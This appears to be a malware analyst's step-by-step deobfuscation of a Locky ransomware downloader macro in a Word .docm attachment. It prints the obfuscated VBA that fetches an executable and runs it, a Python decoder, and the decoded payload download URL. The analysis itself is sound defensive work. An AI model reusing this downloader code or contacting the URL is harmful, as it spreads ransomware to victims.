@@ -1,0 +1,166 @@
+By Tarmo Randel
+
+Save attachment in .eml file to locky-docm.txt
+
+* base64 -d -i locky-docm.txt > locky-docm.docm
+
+* unzip locky-docm.docm to subdir
+
+We need vbaProject.bin for some tools, so here it is:
+ _contents/word/vbaProject.bin
+
+* Do strings 
+
+Interesting:
+
+C:\Users\alex\AppData\Local\Temp\VBE\MSForms.exd
+
+Familiar from previous samples:
+
+D!icrobrioft.XD!LHTTP10)Adodb.britr11aD!10)brih11ll.Application10)Wbricript.brih11ll10)Proc11bribri10)G11T10)T11D!P10)Typ1110)op11n10)writ1110)r11briponbri11Body10)briav11tofil1110)\filarmon.11x11
+
+* olevba.py -d -c locky-docm.docm > locky-docm.docm.olevba.txt
+
+* grep -i createobject locky-docm.docm.olevba.txt
+
+Set IzPodTri = CreateObject(massiveMyData(3))
+Set substruct1 = CreateObject(massiveMyData(1))
+Set stadyBradus = CreateObject(massiveMyData(2))
+Set YKJJJnnnn3_pe__1 = CreateObject(massiveMyData(i - 1))
+
+Assigned in: 
+
+--
+VBA MACRO Module8.bas 
+in file: word/vbaProject.bin - OLE stream: u'VBA/Module8'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+
+Public Function KJnwefkjwh43JHGFBENMNBSJVHBKJSKJMNBSDV_Word(strInspect As String) As Boolean
+ Dim veskonsis As String
+ veskonsis = pirognoe(UserForm1.TextBox1.ControlTipText, "11", "e")
+ veskonsis = pirognoe(veskonsis, "D!", "M")
+ veskonsis = pirognoe(veskonsis, "bri", "s")
+ massiveMyData = Split(veskonsis, "10)")
+ Set substruct1 = CreateObject(massiveMyData(1))
+ Set stadyBradus = CreateObject(massiveMyData(2))
+On Error GoTo Err_Handler:
+ Dim i As Integer
+ Dim d As Boolean
+ d = False
+    
+ KJnwefkjwh43JHGFBENMNBSJVHBKJSKJMNBSDV_Word = True
+For i = 1 To Len(Trim(strInspect))
+ If d = False Then
+ Set YKJJJnnnn3_pe__1 = CreateObject(massiveMyData(i - 1))
+ d = True
+End If
+ Select Case Mid$(Trim(strInspect), i, 1)
+ Case "A" To "Z", "a" To "z"
+ Case "-"
+ Case Else
+ KJnwefkjwh43JHGFBENMNBSJVHBKJSKJMNBSDV_Word = False
+ Exit For
+ End Select
+ Next i
+Exit_Handler:
+ Exit Function
+Err_Handler:
+ 
+ Resume Exit_Handler
+End Function
+-- 
+
+Form element TextBox1 attribute ControlTipText content is used for constructing the array, 
+the content is not extractable with pywordform.py (probably tool needs update in order to 
+support newer formats) but we have it as extracted string already.
+
+"pirognoe" is probably string replacement routine and result is command and variable 
+reference array. So, let's decode array to find commands and variables used by downloader.
+
+massiveMyData = "D!icrobrioft.XD!LHTTP10)Adodb.britr11aD!10)brih11ll.Application10)Wbricript.brih11ll10)Proc11bribri10)G11T10)T11D!P10)Typ1110)op11n10)writ1110)r11briponbri11Body10)briav11tofil1110)\filarmon.11x11".replace("11", "e").replace("D!", "M").replace("bri", "s").split("10)")
+
+we have array:
+0  - 'Microsoft.XMLHTTP'
+1  - 'Adodb.streaM'
+2  - 'shell.Application'
+3  - 'Wscript.shell'
+4  - 'Process'
+5  - 'GeT'
+6  - 'TeMP'
+7  - 'Type'
+8  - 'open'
+9  - 'write'
+10 - 'responseBody'
+11 - 'savetofile'
+12 - '\x0cilarmon.exe' 
+ 
+Let's look at references to massiveMyData (we will not include variable
+creation routines):
+
+Set IzPodTri = CreateObject(massiveMyData(3)) // Wscript Shell
+Set YKJJJnnnn3_pe__3 = IzPodTri.Environment(massiveMyData(4)) // Process
+Set substruct1 = CreateObject(massiveMyData(1)) // ADODB.Stream
+Set stadyBradus = CreateObject(massiveMyData(2)) // shell Application
+Set YKJJJnnnn3_pe__1 = CreateObject(massiveMyData(i - 1)) // 0 = XMLHTTP
+YKJJJnnnn3_pe__1.Open massiveMyData(10 - (2 + 1 + 2)), Djeremy, False // 5 = GET
+YKJJJnnnn3_pe__4 = YKJJJnnnn3_pe__3(massiveMyData(180 / 30)) // 6 = TEMP
+YKJJJnnnn3_peNaStole = YKJJJnnnn3_peNaStole + massiveMyData(55 - 43) // 12 = .exe filename
+
+We are missing the download URL, let's try to find it:
+
+YKJJJnnnn3_pe__1.Open massiveMyData(10 - (2 + 1 + 2)), Djeremy, False // 5 = GET
+
+Djeremy is URL, it is constructed in same procedure as was used for creating 
+massiveMyData array:
+
+Public Function KJnwefkjwh43JHGFBENMNBSJVHBKJSKJMNBSDV_Email(strInspect As String) As Boolean
+On Error GoTo Err_Handler:
+ Set IzPodTri = CreateObject(massiveMyData(3))
+ C = ""
+ Set YKJJJnnnn3_pe__3 = IzPodTri.Environment(massiveMyData(4))
+ Dim IJK As Integer
+For IJK = LBound(TextLenPart) To UBound(TextLenPart)
+ Djeremy = Djeremy & RemoveSpecialChar(IJK)
+ Next IJK
+ Dim strPattern As String
+ strPattern = "^.+@.+\..+$"
+ KJnwefkjwh43JHGFBENMNBSJVHBKJSKJMNBSDV_Email = True
+Exit_Handler:
+ Exit Function
+Err_Handler:
+ Select Case Err.Number
+ Case Else
+ MsgBox "Error #" & Err.Number & ": " & Err.Description, vbCritical, _
+ "Error encountered (#" & Err.Number & " - KJnwefkjwh43JHGFBENMNBSJVHBKJSKJMNBSDV_Email[mod_Validation])"
+ End Select
+ Resume Exit_Handler
+End Function
+
+and constructor is called from autoopen():
+
+KJnwefkjwh43JHGFBENMNBSJVHBKJSKJMNBSDV_Email "d@d"
+
+URL decoding routine is using TextLenPart variable:
+
+TextLenPart = Split("166492102918569210291856921029179292102992892102975292102975292102917609210291776921029188892102916169210291728921029185692102919369210291568921029161692102917289210291728921029155292102973692102915849210291776921029174492102975292102991292102976892102918729210291696921029176092102981692102915689210298969210291584921029816", "921029")
+
+and RemoveSpecialChar() function:
+
+Public Function RemoveSpecialChar(strFileName As Integer) As String
+ RemoveSpecialChar = Chr(CInt(TextLenPart(strFileName)) / (9 + 7))
+End Function
+
+Let's re-create URL decoding in python:
+
+import sys
+def printf(format, *args):
+    sys.stdout.write(format % args)
+
+for i in "166492102918569210291856921029179292102992892102975292102975292102917609210291776921029188892102916169210291728921029185692102919369210291568921029161692102917289210291728921029155292102973692102915849210291776921029174492102975292102991292102976892102918729210291696921029176092102981692102915689210298969210291584921029816".split("921029"):
+	printf("%s", chr( int(i) / 16 ) )
+
+Result: http://noveltybella.com/90ujn3b8c3
+
+Response is empty on manual request.
+
+EOF
